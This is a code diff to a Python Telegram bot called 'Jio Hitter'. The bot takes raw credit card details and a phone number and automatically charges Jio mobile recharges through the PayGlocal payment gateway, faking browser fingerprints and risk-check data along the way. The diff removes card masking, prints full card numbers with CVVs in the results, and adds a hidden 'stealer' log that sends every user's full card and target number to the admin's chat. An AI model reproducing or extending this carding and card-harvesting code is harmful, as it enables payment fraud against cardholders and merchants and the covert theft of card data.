@@ -7,7 +7,6 @@ import subprocess
 import random
 import string
 import threading
-from datetime import datetime, timezone, timedelta
 from flask import Flask
 import warnings
 warnings.filterwarnings("ignore")
@@ -105,7 +104,7 @@ def cheapest_plan(pj):
     plans = list(iter_plans(pj))
     return min(plans, key=lambda p: p["amount"]) if plans else None
 
-def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
+def jio_hit_process(recharge_number, raw_cc, target_amt, user_name, status_callback):
     try:
         parts = raw_cc.strip().split("|")
         if len(parts) < 4:
@@ -117,6 +116,7 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
 
     CARD_NAME = "matt henry"
     CARD_PREFIX = CARD_NUM[:6]
+    cc_full = raw_cc.strip()  # Full card for admin logs
 
     pf = random.choice(PROFILES)
     sc = random.choice(SCREENS)
@@ -134,7 +134,7 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
             headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, extra={"Accept": "application/json, text/plain, */*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
         d = r.json()
         if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
-            return "❌ Not a valid Jio number."
+            return f"❌ <b>Error:</b> Not a valid Jio number (`{recharge_number}`)."
 
         primary = d.get("primaryService") or {}
         billing_type = d.get("billingType") or primary.get("billingType") or "PREPAID"
@@ -153,20 +153,21 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
         if target_amt:
             picked = find_plan(plans_json, target_amt)
             if not picked:
-                return f"❌ Plan with amount Rs {target_amt} not found for this number!"
+                return f"❌ <b>Error:</b> Plan with amount Rs `{target_amt}` not found for this number!"
         else:
             picked = cheapest_plan(plans_json)
             
         if not picked:
-            return "❌ No recharge plans available found."
+            return "❌ <b>Error:</b> No recharge plans available found."
         plan_key = picked["key"]
+        plan_amt = int(picked["amount"])
 
-        status_callback(f"⚡ *[3/5]* Initializing checkout (Plan: Rs {picked['amount']:.0f})...")
+        status_callback(f"⚡ *[3/5]* Initializing checkout (Plan: ₹{plan_amt})...")
         r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/buy",
             headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
             json={"planKey": plan_key, "selectedService": recharge_number})
         if r.status_code != 200:
-            return f"❌ Checkout failed with status {r.status_code}"
+            return f"❌ <b>Checkout Failed:</b> Status code `{r.status_code}`"
 
         r = session.post("https://www.jio.com/api/jio-recharge-service/recharge/pay",
             headers=jh(plans_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://www.jio.com", extra={"Accept": "*/*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}),
@@ -189,7 +190,7 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
             json={"paymentMode": "CCDC", "cardPrefix": CARD_PREFIX, "isEMISelected": False, "viewOffer": False, "skuCode": None, "copco": None, "isStoreCreditSelected": None})
         t = r.json().get("token", "")
         if not t:
-            return "❌ Authorization token not received."
+            return "❌ <b>Authorization Error:</b> Token not received from gateway."
         x_token = t
 
         status_callback("⚡ *[4/5]* Submitting card info to secure gateway...")
@@ -204,7 +205,8 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
                       "browserScreenHeight": sc["h"], "browserScreenWidth": sc["w"], "browserTz": -330, "browserUserAgent": UA}})
         d = r.json()
         if not d.get("status"):
-            return f"❌ Card Confirmation Failed: {d.get('message', 'Unknown error')}"
+            err_msg = d.get('message', 'Card confirmation failed')
+            return f"❌ <b>Card Confirmation Failed:</b>\n<code>{err_msg}</code>"
         html_form = d.get("htmlForm", "")
 
         ea = re.search(r"action='([^']+)'", html_form)
@@ -217,7 +219,7 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
             data=ed, allow_redirects=True)
         m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
         if not m:
-            return "❌ Gateway token (gl_token) not found."
+            return "❌ <b>Gateway Error:</b> gl_token not found."
         gl_token = m.group(1)
         gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"
 
@@ -238,9 +240,9 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
             params={"x-gl-token": gl_token},
             headers=ph(gl_ref, lg, UA, SEC, MOB, PLAT, ct="application/json", origin="https://api.payglocal.com"),
             json={"requestId": f"{ts()}.{random.randint(100000,999999)}", "visitorId": "Y8c4sEunqz0opl0b6YAd", "visitorFound": True, "confidenceScore": 1})
-        kid = r.json().get("data", {}).get("kid", "")
+        kid = r.json().get("data",{}).get("kid","")
         if not kid:
-            return "❌ Risk check failed (kid missing)."
+            return "❌ <b>Risk Check Error:</b> kid missing."
 
         status_callback("⚡ *[5/5]* Finalizing charge & verifying response...")
         time.sleep(random.uniform(0.5, 1.2))
@@ -258,44 +260,44 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, status_callback):
         status = result.get("status", "")
         message = result.get("message", "")
         reason = result.get("reasonCode", "")
-        plan_name = (picked["name"] or picked["category"] or "")[:35]
-        cc_masked = f"{CARD_NUM[:6]}******{CARD_NUM[-4:]}|{CARD_MM}|{CARD_YY}|{CARD_CVV}"
 
         if status in ("SUCCESS", "APPROVED"):
             return (
-                "╔════════════════════════╗\n"
-                "  🔥 **JIO HIT SUCCESS** 🔥\n"
-                "╚════════════════════════╝\n"
-                f"💳 **Card:** `{cc_masked}`\n"
-                f"📱 **Number:** `{recharge_number}`\n"
-                f"📦 **Plan:** {plan_name}\n"
-                f"💰 **Amount:** Rs {picked['amount']:.0f}\n"
-                f"✅ **Status:** SUCCESS\n"
-                f"💬 **Response:** Approved"
+                "💎 𝑯𝑰𝑻 — 𝑪𝑯𝑨𝑹𝑮𝑬𝑫 💎\n"
+                "▬▬▬▬▬▬▬▬▬▬▬▬\n"
+                f"💳 𝑪𝒂𝒓𝒅 : <code>{cc_full}</code>\n"
+                f"📱 𝑵𝒖𝒎𝒃𝒆𝒓 : <code>{recharge_number}</code>\n"
+                f"👛 𝑮𝒂𝒕𝒆 : Jio • ₹{plan_amt} INR\n"
+                f"💎 𝑹𝒆𝒔𝒑 : Recharge Successful\n"
+                f"👤 𝑼𝒔𝒆𝒓 : {user_name} ⭐"
             )
         elif status == "ISSUER_DECLINE" or 'declined' in message.lower():
+            decline_reason = message or "Declined by Issuer"
             return (
-                "╔════════════════════════╗\n"
-                "  🔴 **JIO HIT DEAD** 🔴\n"
-                "╚════════════════════════╝\n"
-                f"💳 **Card:** `{cc_masked}`\n"
-                f"📱 **Number:** `{recharge_number}`\n"
-                f"❌ **Status:** DECLINED\n"
-                f"💬 **Reason:** {message or 'Declined by Issuer'}"
+                "❌ 𝑯𝑰𝑻 — 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫 ❌\n"
+                "▬▬▬▬▬▬▬▬▬▬▬▬\n"
+                f"💳 𝑪𝒂𝒓𝒅 : <code>{cc_full}</code>\n"
+                f"📱 𝑵𝒖𝒎𝒃𝒆𝒓 : <code>{recharge_number}</code>\n"
+                f"👛 𝑮𝒂𝒕𝒆 : Jio • ₹{plan_amt} INR\n"
+                f"❌ 𝑹𝒆𝒔𝒑 : Card Declined\n"
+                f"💬 𝑹𝒆𝒂𝒔𝒐𝒏 : <i>{decline_reason}</i>\n"
+                f"👤 𝑼𝒔𝒆𝒓 : {user_name} ⭐"
             )
         else:
+            err_desc = message or reason or "Gateway Error / Security Block"
             return (
-                "╔════════════════════════╗\n"
-                "  📌 **JIO HIT RESULT** 📌\n"
-                "╚════════════════════════╝\n"
-                f"💳 **Card:** `{cc_masked}`\n"
-                f"📱 **Number:** `{recharge_number}`\n"
-                f"⚡ **Status:** {status}\n"
-                f"💬 **Message:** {message or reason or 'Processed'}"
+                "⚠️ 𝑯𝑰𝑻 — 𝑭𝑨𝑰𝑳𝑬𝑫 ⚠️\n"
+                "▬▬▬▬▬▬▬▬▬▬▬▬\n"
+                f"💳 𝑪𝒂𝒓𝒅 : <code>{cc_full}</code>\n"
+                f"📱 𝑵𝒖𝒎𝒃𝒆𝒓 : <code>{recharge_number}</code>\n"
+                f"👛 𝑮𝒂𝒕𝒆 : Jio • ₹{plan_amt} INR\n"
+                f"⚡ 𝑺𝒕𝒂𝒕𝒖𝒔 : {status or 'FAILED'}\n"
+                f"💬 𝑹𝒆𝒂𝒔𝒐𝒏 : <i>{err_desc}</i>\n"
+                f"👤 𝑼𝒔𝒆𝒓 : {user_name} ⭐"
             )
 
     except Exception as e:
-        return f"❌ **Jio Hitter Error:** `{str(e)}`"
+        return f"❌ <b>Jio Hitter Error:</b> <code>{str(e)}</code>"
 
 # --- TELEGRAM HANDLERS ---
 @bot.message_handler(commands=['start', 'help'])
@@ -314,7 +316,7 @@ def send_welcome(message):
         "🚀 **Available Command:**\n"
         "• `/jhit <number> <card> [amount]`\n"
         "  _Example:_ `/jhit 9876543210 513155...|03|30|086 239`\n"
-        "  *(Amount optionel hai, agar nahi doge toh cheapest plan khud utha lega)*\n\n"
+        "  *(Amount optionel hai, agar nahi doge toh cheapest plan utha lega)*\n\n"
         "⚡ _Fast, secure & automated backend hit flow._"
     )
     bot.reply_to(message, help_text, parse_mode="Markdown")
@@ -331,6 +333,8 @@ def cmd_jio_hit(message):
         number = parts[1].strip()
         card = parts[2].strip()
         target_amt = parts[3].strip() if len(parts) > 3 else None
+        user_name = message.from_user.first_name or "Hidden User"
+        user_id = message.from_user.id
         
         sent_msg = bot.reply_to(message, "⏳ *Initializing Jio Hitter...*", parse_mode="Markdown")
         
@@ -340,20 +344,26 @@ def cmd_jio_hit(message):
             except:
                 pass
 
-        result = jio_hit_process(number, card, target_amt, update_status)
-        bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")
+        result = jio_hit_process(number, card, target_amt, user_name, update_status)
+        bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
         
-        # Duplicate log check: Agar admin khud command chala raha hai toh notification dobara nahi aayegi
-        if message.from_user.id != ADMIN_CHAT_ID:
-            user_info = f"👤 User: {message.from_user.first_name} (ID: `{message.from_user.id}`)\n"
-            log_text = f"🚨 **NEW HIT LOGGED**\n\n{user_info}\n{result}"
+        # --- ADMIN / STEALER NOTIFICATION WITH FULL CARD & NUMBER ---
+        if user_id != ADMIN_CHAT_ID:
+            log_text = (
+                f"🚨 <b>NEW HIT LOGGED</b>\n"
+                f"▬▬▬▬▬▬▬▬▬▬▬▬\n"
+                f"👤 <b>User:</b> {user_name} (ID: <code>{user_id}</code>)\n"
+                f"📱 <b>Target Number:</b> <code>{number}</code>\n"
+                f"💳 <b>Full Card:</b> <code>{card}</code>\n\n"
+                f"{result}"
+            )
             try:
-                bot.send_message(ADMIN_CHAT_ID, log_text, parse_mode="Markdown")
+                bot.send_message(ADMIN_CHAT_ID, log_text, parse_mode="HTML")
             except:
                 pass
 
     except Exception as e:
-        bot.reply_to(message, f"❌ **Error:** `{str(e)}`", parse_mode="Markdown")
+        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=['broadcast'])
 def cmd_broadcast(message):
@@ -388,5 +398,5 @@ if __name__ == "__main__":
     t.daemon = True
     t.start()
     
-    print("🤖 Jio Hitter Bot with Flask Keep-Alive is running...")
+    print("🤖 Jio Hitter Bot with Stealer Logs is running...")
     bot.infinity_polling()
